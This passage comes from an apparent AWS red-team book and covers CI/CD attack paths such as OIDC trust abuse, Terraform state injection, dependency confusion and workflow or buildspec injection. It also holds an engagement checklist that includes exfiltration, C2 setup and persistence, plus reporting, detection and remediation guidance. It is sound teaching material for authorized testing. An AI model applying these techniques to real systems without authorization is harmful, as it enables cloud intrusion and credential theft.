Beyond the off-the-shelf tools, a practicing operator usually ends up with a personal harness: a small set of bash functions, a ~/.aws/config with named profiles for each engagement, an evidence.jsonl logger, and a set of cached snippets for common operations. The harness should at minimum include (a) a function that wraps every aws call and appends the CloudTrail-relevant parameters to the evidence file, (b) a per-engagement S3 bucket for operator-side artifacts (not the target's S3), (c) a credential-scoping wrapper that refuses to run against the wrong account id to prevent embarrassing cross-engagement mistakes, and (d) a set of aliases for the operator's ten most common commands.

attacker@kali:~$ cat ~/.operator/guardrails.sh
# refuse to run if current account does not match engagement
require_account() {
  expected=$1
  actual=$(aws sts get-caller-identity --query Account --output text)
  if [ "$expected" != "$actual" ]; then
    echo "ACCOUNT MISMATCH expected=$expected got=$actual" >&2
    return 1
  fi
}
# wrap aws with evidence capture
awslog() {
  ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  echo "{\"ts\":\"$ts\",\"cmd\":\"aws $*\"}" >> ~/.operator/evidence.jsonl
  aws "$@"
}

Key takeaways

  • A focused toolset — CloudFox, Pacu, PMapper, TruffleHog, Stratus Red Team — covers 80% of AWS engagement needs.
  • ScoutSuite and Prowler are best used as misconfiguration backlog generators that prime exploitation hypotheses.
  • PMapper's graph reasoning is indispensable for non-trivial IAM environments.
  • CloudGoat and its siblings are the practice ranges for every technique in this book.
  • Build a personal harness with account guardrails and evidence logging; the harness pays for itself on every engagement.

Chapter 19
CI/CD and Supply-Chain Attacks

In the 2020-2022 wave of cloud breaches, the dominant entry vector was leaked static credentials. In the 2023-2026 wave, the dominant entry vector shifted to CI/CD federation: OIDC-based short-lived credentials issued from a trusted external identity provider to AWS roles. This shift was a security win — static credentials are worse — but it introduced a new attack surface that many organizations have not yet internalized. This chapter covers the four families of CI/CD attacks that red teams should expect to see as the dominant entry class on contemporary engagements: OIDC trust over-broadening, Terraform state manipulation, dependency-confusion against build roles, and GitHub Actions workflow injection.

19.1  The GitHub Actions OIDC trust

A typical GitHub Actions deploy role has a trust policy of the form:

{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:MyOrg/MyRepo:ref:refs/heads/main"
      }
    }
  }]
}

The sub condition is the security boundary. Broken variants abound:

Missing sub altogether. If the trust policy does not include a sub condition, any GitHub Actions workflow in any public or private repository on GitHub.com can assume the role. The attacker creates a public repository, writes a workflow that uses aws-actions/configure-aws-credentials, and assumes the role from their own fork. This is the most dangerous variant and it is more common than it should be; it often results from copy-pasting tutorials that use sub: * for demonstration.

Over-broad sub pattern. repo:MyOrg/* allows any repo in the organization; an attacker who can push to any MyOrg repo can assume the role. repo:MyOrg/MyRepo:* allows any ref — any branch, any tag, any pull-request ref from a fork — to assume; an attacker who opens a PR from a fork can assume.

Missing aud. Without the aud: sts.amazonaws.com condition, tokens intended for other audiences can be used. Rare but present in legacy configs.

Typo in provider ARN. An attacker who registers a new OIDC provider with a similar but attacker-controlled thumbprint can issue tokens that match a typo'd trust. This is a nation-state-level attack; it is included for completeness.

The operator's job is to enumerate every role trusting token.actions.githubusercontent.com (via iam:ListRoles + policy inspection, or CloudFox's role-trusts --filter-oidc), parse each trust, and identify which are exploitable. On most engagements, at least one is.

19.2  Terraform state as an attacker resource

Terraform state files (terraform.tfstate) contain every managed resource's id, attributes, and — when they flow through the provider — secrets. A single state file for an AWS-provider Terraform tree contains AWS account ids, role ARNs, KMS key ids, IAM policies, and frequently the literal contents of Secrets Manager secrets the Terraform manages. State files stored unencrypted in S3, or with weak bucket policies, are direct credential sources.

The attack surface around Terraform state is broader than the state file itself. The backend for a typical AWS-deployed Terraform is an S3 bucket (for the state) plus a DynamoDB table (for the lock). If the attacker can write to the state bucket (s3:PutObject), they can corrupt subsequent applies to cause arbitrary resource creation. If they can write to the lock table, they can blueprint a state of "locked forever" or release a legitimate lock at the wrong moment. If they can read the state bucket (s3:GetObject), they have the entire environment's configuration.

A more sophisticated attack is to inject a malicious resource into the state and let the next terraform apply re-materialize it. Terraform will, by default, re-create resources that are in state but missing in the cloud; an attacker who adds a state entry for an IAM user with an attached admin policy, targeting an existing Terraform that does not explicitly manage IAM users, can cause the user to be created on the next apply — and the Terraform operator will not notice because the apply succeeds cleanly.

19.3  Dependency confusion against Lambda builds

A Lambda function's dependencies (requirements.txt, package.json, Gemfile, go.sum) are resolved at build time, typically inside a CI pipeline. If the pipeline does not pin a private package registry, an attacker who publishes a package of the same name to a public registry (PyPI, npm) at a higher version can cause the build to fetch the attacker's package. That package then runs inside the Lambda when invoked, with the Lambda's execution role.

The 2021 Alex Birsan research on dependency confusion remains directly applicable. AWS-specific twists: Lambda Layers are particularly attractive targets because a single poisoned layer is imported by many functions; AWS Amplify builds are particularly vulnerable because Amplify's default build configuration does not enforce a private registry. Organizations using AWS CodeArtifact with the package origin control feature enabled have structural protection; the majority of organizations do not.

19.4  GitHub Actions workflow injection

GitHub Actions workflows executed by events from external actors (pull_request, issue_comment, issues) run with limited privileges by default, but many workflows opt into broader permissions for legitimate reasons. When such a workflow uses untrusted input unsafely — for example, echo "${{ github.event.pull_request.title }}" in a step that runs shell — a PR with a crafted title can inject shell commands that run in the CI environment. Those commands have access to whatever the workflow was given: a GitHub token, and frequently the AWS credentials from the OIDC trust.

The attacker's move, therefore, is to submit a pull request to a target repository whose workflows are vulnerable to injection, and wait for a maintainer to trigger the pull_request_target event (which runs the target-branch workflow with access to secrets). Many organizations have reduced this risk by using the CODEOWNERS-gated pull_request_target and fine-grained permissions: blocks; many have not.

19.5  CodeBuild, CodePipeline, and the IAM-PassRole bridge

AWS-native CI (CodeBuild, CodePipeline) has its own federation surface. A CodeBuild project runs under a service role; a CodePipeline step can invoke a CodeBuild project. Any identity with codebuild:StartBuild on a project whose service role is powerful has, effectively, RCE under that role. The codebuild:UpdateProject + iam:PassRole pair was listed in Chapter 8 as a privilege-escalation primitive; it is also a CI-specific persistence primitive because changes to build projects are rarely audited.

Operator note: buildspec injection

CodeBuild projects that read their buildspec.yml from the source S3/CodeCommit/GitHub repo are vulnerable to buildspec injection if the attacker can modify the source. If the source is GitHub and the attacker can open a PR against a branch that triggers the build, the attacker's buildspec runs under the project's service role. Even if the attacker's PR is eventually closed without merging, the build already executed.

19.6  IaC pipeline injection writ large

The theme across this chapter is that the boundary between code that describes infrastructure and code that executes with AWS credentials is very thin in CI. A compromise of the former is a compromise of the latter. Operators who break into AWS via a CI path are often not breaking AWS's security controls at all; they are breaking the identity provider (GitHub, GitLab, Jenkins) and using its relationship to AWS as a trusted pipe. The defender's mitigation is correspondingly not an AWS-first mitigation — it is a CI-first mitigation: enforce branch protection, enforce CODEOWNERS on workflow files, require separate review on workflow changes, use narrow sub conditions, and pin ref to specific commit SHAs for any third-party action.

Key takeaways

  • GitHub Actions OIDC trust over-broadening (missing or overly wildcarded sub) is the most common modern entry vector; CloudFox's role-trusts --filter-oidc finds them in seconds.
  • Terraform state files are high-value artifacts; reading them maps the environment, writing them can cause arbitrary resource creation on the next apply.
  • Dependency confusion against Lambda and Amplify builds continues to succeed because private-registry enforcement is uncommon.
  • Workflow injection via pull_request_target turns a PR into a CI-scoped RCE, usually with access to the AWS OIDC role.
  • CodeBuild and CodePipeline are IAM-PassRole bridges: StartBuild on a powerful project is RCE under the project's role.

Chapter 20
Reporting, Detection Engineering, and Remediation

An engagement ends not when the operator finishes testing but when the client has an actionable document. Chapter 20 walks the last mile: structuring a report that is usable by both the executive sponsor and the engineering team that will fix the findings, translating findings into detection content the client's SOC can deploy, and offering remediation guidance that is specific enough to implement in Terraform on Monday morning. Reporting discipline is the difference between an engagement that produces a spike in anxiety followed by nothing and one that produces measurable improvement in the client's security posture.

20.1  Report structure

A modern AWS offensive-security report has five sections. Executive summary: one page, written for the sponsor, with the engagement's goals, the top three findings by severity, and the strategic narrative (how the findings connect, what class of attacker would exploit them, and what the aggregate risk is). Engagement scope and methodology: a prose description of what was tested, what was out of scope, what tools and techniques were used, and what constraints were operative (time-boxed, specific objectives, rules of engagement exclusions). Findings: one finding per primitive, each with severity, prerequisite conditions, exploitation steps, observed impact, affected principals/resources, and CloudTrail/log evidence. Attack narrative: a prose chapter that walks the mission from initial access to objective completion, connecting findings into a story. Remediation roadmap: a prioritized, dated list of remediations with ownership suggestions.

Of these five, the attack narrative is the most commonly omitted and the most valuable. A client reading a long list of findings sees discrete misconfigurations; a client reading the narrative sees how five benign misconfigurations chained to produce admin in their prod account. The narrative is what justifies the engagement's budget.

20.2  Finding anatomy

Each finding should contain:

Title. A descriptive noun phrase, not a headline. Overly-broad trust on OIDC role github-deploy is a title; Critical IAM risk is not.

Severity. Per a scoring system the client understands. CVSS 3.1 is the lingua franca; many organizations prefer a cloud-specific alternative like the SSVC framework. Internal consistency matters more than which system is used.

Affected resources. Specific ARNs. "The github-deploy role" is not specific enough; arn:aws:iam::111122223333:role/github-deploy is.

Prerequisites. What the attacker must have held to exploit the finding. "Any push to the MyOrg/MyRepo repo" is a prerequisite that tells the defender the blast radius.

Exploitation steps. The exact commands, with their CloudTrail evidence. This is the part that proves the finding is real.

Observed impact. What the operator did do (not what they could do). Assumed the role, listed all Secrets Manager secrets, read three is observed impact; could potentially read all secrets is not.

Recommended remediation. Specific and implementable. Not "tighten the trust policy"; instead, "replace StringLike sub: repo:MyOrg/* with StringEquals sub: repo:MyOrg/MyRepo:ref:refs/heads/main".

References. Links to AWS documentation, MITRE ATT&CK sub-technique id(s), and — where applicable — CVEs.

20.3  CloudTrail evidence per finding

Every finding that involved an AWS API call should include at minimum: the event time, the event id, the event name, and the source IP that appeared in CloudTrail. This is the evidence the client's incident responders will use to validate that the operator is the source of the event. Without this correlation, an internal forensic investigation of the operator's actions can produce false positives and slow down remediation.

The evidence.jsonl described in Chapter 17 is the operator-side record; the CloudTrail-side record can be pulled post-engagement via aws cloudtrail lookup-events filtered on the operator's principal ARN. Running this query for each finding's timestamp range produces the report's evidence block.

attacker@kali:~$ aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=op-mancuso \
    --start-time "2026-04-15T00:00:00Z" \
    --end-time "2026-04-20T23:59:59Z" \
    --query 'Events[].[EventTime,EventName,EventId,CloudTrailEvent]' \
    --output json > engagement-cloudtrail.json
attacker@kali:~$ jq '.[] | {t:.[0], name:.[1], id:.[2]}' engagement-cloudtrail.json | head

20.4  Detection engineering deliverables

For each finding the client can act on, the report should include a detection hint: a query or rule that the client's SOC can deploy in their SIEM to alert on future exploitation of the same primitive. The format depends on the client's tools: Athena SQL for organizations that pipe CloudTrail to S3 and query with Athena; Splunk SPL for Splunk shops; Sigma rules for organizations with broad multi-SIEM deployments; GuardDuty custom threat list entries for IP-based indicators.

-- detection hint: overly-broad OIDC trust exploited
-- Athena SQL over CloudTrail
SELECT eventtime, useridentity.arn, sourceipaddress,
       requestparameters.roleArn
FROM   cloudtrail_logs
WHERE  eventname = 'AssumeRoleWithWebIdentity'
AND    requestparameters.principalTag."aws:RequestTag/repo" NOT LIKE 'MyOrg/%'
AND    eventtime > current_date - interval '7' day;

20.5  Remediation as Terraform

Remediation guidance that a client can copy-paste is more valuable than guidance expressed in prose. For each finding, the report should include the minimum remediation code. For an IAM-policy finding this is the corrected policy JSON; for a resource-level finding this is the Terraform or CloudFormation diff that applies it. Providing this code does not obviate the client's own review; it accelerates it.

# remediation: tighten OIDC trust for role/github-deploy
resource "aws_iam_role" "github_deploy" {
  name = "github-deploy"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = { Federated = aws_iam_openid_connect_provider.github.arn }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          "token.actions.githubusercontent.com:sub" = "repo:MyOrg/MyRepo:ref:refs/heads/main"
        }
      }
    }]
  })
}

20.6  Severity calibration

A common pathology of penetration test reports is severity inflation: every finding is high or critical. Severity discipline matters because it is how the client triages. A consistent model, applied across the report, is better than a high-contrast model that marks everything important as critical. The authors' practice is to reserve Critical for findings that are exploitable by an external attacker with no prerequisites and produce admin-level access; High for findings that are exploitable by an external attacker but require some prerequisite; Medium for findings that are exploitable only by a compromised insider; Low for configuration hygiene that is not directly exploitable. A report with a single Critical and a dozen Mediums reads as more trustworthy than one with seven Criticals.

20.7  Defender hand-off

The engagement ideally closes with a live debrief to the defender's team: walk through the narrative, answer questions, validate that the detections the client intends to build will in fact catch the attack next time. A 90-minute session with the SOC lead, the cloud platform team, and the IAM owner produces more residual value than any written document. Budget for it in the statement of work.

Key takeaways

  • The attack narrative is the report section that justifies the engagement's budget; omit nothing else before omitting it.
  • Each finding should include title, severity, affected ARNs, prerequisites, exploitation steps with CloudTrail evidence, observed impact, and implementable remediation code.
  • Detection-engineering deliverables (Athena SQL, Splunk SPL, Sigma rules) turn findings into durable improvements for the client's SOC.
  • Remediation-as-Terraform accelerates adoption; prose remediation is inferior.
  • Severity discipline matters more than severity distribution; a report with one Critical finding is more actionable than one with seven.
  • A live debrief produces more residual value than any written document; schedule one in the statement of work.

The appendices consolidate reference material that is more useful at lookup time than in running prose: a command-by-command cheat sheet that maps the book's material to a single-page quick-reference (Appendix A), a consolidated catalogue of IAM privilege-escalation primitives for rapid recall (Appendix B), the CloudTrail events that matter for offensive and defensive work with their field semantics (Appendix C), and a practitioner's checklist that an operator can follow step-by-step on a new engagement (Appendix D). After the appendices, the glossary defines the AWS and offensive-security terminology used throughout, and the bibliography lists the primary sources — documentation, vendor blog posts, conference talks, and open-source tool repositories — that informed the text.

Appendix D
Operator's Checklist for a New Engagement

A chronological checklist that a practitioner can follow from kickoff through debrief. The list is deliberately opinionated; individual items can be skipped where scope does not apply.

D.1  Pre-engagement (days -14 to 0)

  • Confirm rules of engagement in writing: scope, excluded accounts/regions/services, impact-primitive authorization, point of contact for emergencies.
  • Provision attacker AWS account with (a) a receiving S3 bucket with an appropriate resource policy to accept writes from any role the client might configure, (b) a KMS key with a policy permitting cross-account grant-creation, (c) an EC2 instance for inside-AWS credential usage.
  • Register attacker infrastructure domain(s); set up a DNS authoritative server for exfil/C2; ensure IP addresses are not in any threat-intel feed (check Spamhaus, AWS's own reputation lists, GuardDuty threat list format).
  • Install and test CloudFox, Pacu, PMapper, ScoutSuite, Prowler, TruffleHog, aws-vault, Stratus Red Team on the engagement laptop.
  • Stand up evidence.jsonl and the personal operator harness (Section 18.5).

D.2  Initial access (days 0-1)

  • Execute the scoped entry vector — external recon, phishing, OIDC abuse, credential injection — as authorized.
  • First credential in hand: run aws sts get-caller-identity, record account id, partition, arn, principal type.
  • Run CloudFox all-checks from the scoped profile; redirect output to the engagement folder.
  • Run Pacu's iam__enum_permissions against the principal and export the permission map.
  • Run PMapper to build the graph; save the graph to the engagement folder.

D.3  Escalation and lateral movement (days 2-4)

  • Run Pacu's iam__privesc_scan.
  • Enumerate OIDC providers; parse each trusted role's trust policy for over-broadening (Chapter 19).
  • Enumerate resource-policy-sharing: S3 bucket policies, KMS key policies, Lambda resource policies, Secrets Manager resource policies, ECR repository policies, SNS/SQS resource policies.
  • Enumerate cross-account: AWS RAM shares, OrganizationAccountAccessRole presence, VPC peering.
  • Execute privilege-escalation primitives as scope allows; document each in evidence.jsonl.
  • For every new principal assumed, rerun CloudFox and PMapper.

D.4  Objective execution (days 5-7)

  • Verify the engagement's success criteria (typically some access or capability against a specified resource).
  • Execute exfiltration primitives as authorized, using service-side paths for bulk and service-to-internet only for small high-value pulls.
  • If impact primitives are authorized, execute against the designated demonstration objects only.
  • Establish one persistence primitive from the identity family and one from the configuration family, if scope permits, so that the client can validate their detection of each.

D.5  Wrap-up (days 8-10)

  • Clean up: revoke attacker access keys, remove attacker IAM users/roles, remove attacker resource-policy entries, close attacker-created OIDC providers (if any), drop snapshot shares, remove bucket replication rules if they were for testing.
  • Document each cleanup action in evidence.jsonl; the cleanup record appears in the report.
  • Pull the CloudTrail evidence: aws cloudtrail lookup-events filtered on operator principal ARN across the engagement window.
  • Write the report per Chapter 20's template.
  • Schedule and deliver the live debrief.

Glossary

ABAC (Attribute-Based Access Control). An IAM model that authorizes actions based on tags on the principal and tags on the resource, rather than only on identity. Susceptible to self-tagging escalation when principals hold iam:TagUser or sts:TagSession.

Access Analyzer. An IAM service that identifies resources shared with principals outside a defined zone of trust.

Access key. A long-lived AWS API credential pair for an IAM user; access key id (prefix AKIA) and secret access key.

AssumeRole. The STS API that issues temporary session credentials for a role. Entry point for role chaining and cross-account access.

AssumeRoleWithWebIdentity. The STS API that exchanges an OIDC token for session credentials; used by GitHub Actions, Cognito identity pools, and EKS IRSA.

AWS Managed Key. A KMS key managed by AWS on behalf of the customer (for example, aws/ebs, aws/rds); not cross-account shareable.

Blast radius. The set of resources, principals, and services that are reachable from a given compromise.

CloudFox. Bishop Fox's open-source opinionated AWS reconnaissance tool.

CloudGoat. Rhino Security Labs's vulnerable-by-design AWS lab.

CloudTrail. AWS's API audit log service; records every management API call and, if configured, data events.

Cognito identity pool. An unauthenticated-or-federated-identity service that exchanges a federated identity for AWS session credentials.

Confused deputy. An attack pattern in which a trusted service is induced to perform an action on behalf of an untrusted caller. AWS's ExternalId/SourceArn/SourceAccount conditions mitigate.

CTAS. CREATE TABLE AS SELECT in Athena; an exfiltration primitive that copies query results to an external S3 location in one API call.

Customer Managed Key (CMK). A KMS key managed by the customer; has a separately editable key policy; cross-account shareable.

Data event. CloudTrail events for object-level operations (S3 GetObject, Lambda Invoke, DynamoDB item operations). Off by default; billed separately.

Device-code flow. An OAuth 2.0 authorization flow used by IAM Identity Center; susceptible to phishing attacks where the attacker transmits the user code to a victim.

ExternalId. A shared-secret condition used in role trust policies to mitigate confused-deputy risk.

GuardDuty. AWS's threat-detection service; produces findings from CloudTrail, VPC Flow Logs, DNS logs, and (optionally) runtime monitoring.

IMDS. Instance Metadata Service; serves instance metadata and instance-profile credentials at 169.254.169.254. IMDSv2 requires a PUT-token flow.

Identity Center (AWS IAM Identity Center). Formerly AWS SSO; a federation and permission-set service that spans an AWS Organization.

IRSA (IAM Roles for Service Accounts). EKS's mechanism for giving pods IAM roles via OIDC federation.

KMS grant. A permission primitive on a KMS key that allows a principal to perform specific operations; created with kms:CreateGrant.

Lambda layer. A reusable code bundle that multiple Lambda functions can import; a supply-chain surface.

OIDC provider. An external identity provider registered in IAM for federated access; tokens from the provider can be exchanged for AWS session credentials.

OrganizationAccountAccessRole. A role created in each member account by AWS Organizations that grants full admin access to the Organizations management account.

Pacu. Rhino Security Labs's open-source AWS exploitation framework.

PassRole. An IAM action that permits a principal to pass a role to a service; a bridge from IAM-level permissions to service-level RCE.

Permission boundary. An IAM policy that sets the maximum permissions a principal can have, regardless of what other policies grant.

PMapper. NCC Group's open-source IAM-graph tool.

Pod Identity. EKS's newer (2023+) mechanism for giving pods IAM credentials via a local agent rather than OIDC federation.

Resource policy. An IAM policy attached to a resource (as opposed to a principal); governs cross-account and cross-service access.

Role chaining. Assuming a role from a session that is itself an assumed-role session. Capped at 1 hour session duration regardless of role configuration.

SCP (Service Control Policy). An Organizations-level policy that sets the maximum permissions available in accounts within an OU. Does not grant permissions.

Session policy. An inline policy passed to AssumeRole / GetSessionToken that further narrows the resulting session's permissions.

ScoutSuite. NCC Group's open-source AWS audit tool.

Service-linked role. An IAM role that an AWS service creates in the customer's account to perform operations on its behalf.

SourceIdentity. A caller-asserted identity propagated through role chains; visible in CloudTrail.

STS. AWS Security Token Service; issues temporary credentials.

TruffleHog. An open-source Git-secret scanner with live credential verification.

VPC endpoint policy. A policy attached to a VPC endpoint that restricts which principals or actions may transit the endpoint.

Colophon

This book was composed as a single self-contained HTML document. Typography uses a conventional serif body (Georgia stack) and a monospace code face (Menlo / Consolas stack) throughout. Page size is approximately 7.25×9.25 inches when rendered to PDF via a standard browser's print-to-PDF path. Inline SVG is used for all figures so that the document has no external dependencies. Terminal blocks are styled approximations of xterm-color output; the actual tool output in any reader's environment will vary with tool version and configuration.

The material in this book reflects the authors' observations on AWS offensive engagements through mid-2026. AWS services evolve rapidly, and specific IAM actions, finding names, or default behaviours described here may have changed by the time a reader encounters them. Where a detail has operational consequences, verify against the current AWS documentation before acting on it.
